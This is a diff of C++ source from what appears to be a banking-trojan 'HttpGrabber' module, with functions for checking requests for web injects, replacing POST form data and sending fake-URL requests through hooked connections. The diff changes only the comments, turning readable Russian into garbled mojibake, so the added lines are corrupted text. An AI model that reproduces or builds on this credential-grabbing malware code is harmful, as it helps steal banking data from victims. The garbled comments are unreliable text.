@@ -269,12 +269,12 @@ bool HttpGrabber::_isUrlInList(DWORD listId, const BinStorage::STORAGE *localCon
 }
 
 /*
-  Проверка запроса на необходимость инждекта.
+  РџСЂРѕРІРµСЂРєР° Р·Р°РїСЂРѕСЃР° РЅР° РЅРµРѕР±С…РѕРґРёРјРѕСЃС‚СЊ РёРЅР¶РґРµРєС‚Р°.
 
-  IN OUT requestData - запрос.
+  IN OUT requestData - Р·Р°РїСЂРѕСЃ.
 
-  Return             - true - инжекты применины,
-                       false - инжекты не применены
+  Return             - true - РёРЅР¶РµРєС‚С‹ РїСЂРёРјРµРЅРёРЅС‹,
+                       false - РёРЅР¶РµРєС‚С‹ РЅРµ РїСЂРёРјРµРЅРµРЅС‹
 */
 static bool checkRequestForInject(HttpGrabber::REQUESTDATA *requestData)
 {
@@ -427,12 +427,12 @@ SKIP_ITEM:;
 }
 
 /*
-  Замена POST-данных "application/x-www-form-urlencoded".
+  Р—Р°РјРµРЅР° POST-РґР°РЅРЅС‹С… "application/x-www-form-urlencoded".
 
-  IN OUT requestData - запрос.
+  IN OUT requestData - Р·Р°РїСЂРѕСЃ.
 
-  Return             - true - данные заменены,
-                       false - данные не заменены.
+  Return             - true - РґР°РЅРЅС‹Рµ Р·Р°РјРµРЅРµРЅС‹,
+                       false - РґР°РЅРЅС‹Рµ РЅРµ Р·Р°РјРµРЅРµРЅС‹.
 */
 static bool replacePostData(HttpGrabber::REQUESTDATA *requestData)
 {
@@ -543,7 +543,7 @@ DWORD HttpGrabber::analizeRequestData(REQUESTDATA *requestData)
 #endif
 
   DWORD retVal = 0;
-  signed char writeReport = -1;/*-1 - по умолчанию, 0 - не писать, 1 - принудительно писать*/;
+  signed char writeReport = -1;/*-1 - РїРѕ СѓРјРѕР»С‡Р°РЅРёСЋ, 0 - РЅРµ РїРёСЃР°С‚СЊ, 1 - РїСЂРёРЅСѓРґРёС‚РµР»СЊРЅРѕ РїРёСЃР°С‚СЊ*/;
 
   //Check for blockage.
   CWA(kernel32, EnterCriticalSection)(&blockInjectInfo.cs);
@@ -1054,13 +1054,13 @@ typedef struct
   HINTERNET fakeRequest;
 }FAKECONNECT;
 
-/*В В Create a query to the fake-URL.
+/*Р’В Р’В Create a query to the fake-URL.
 
-В В IN requestData - request data.
-В В IN faketUrl - fake-URL.
-В В IN verb - GET / POST.
+Р’В Р’В IN requestData - request data.
+Р’В Р’В IN faketUrl - fake-URL.
+Р’В Р’В IN verb - GET / POST.
 
-В В Return - the handle to the query, NULL - otherwise.*/
+Р’В Р’В Return - the handle to the query, NULL - otherwise.*/
 static DWORD WINAPI fakeConnectProc(void *p)
 {
   CoreHook::disableFileHookerForCurrentThread(true);
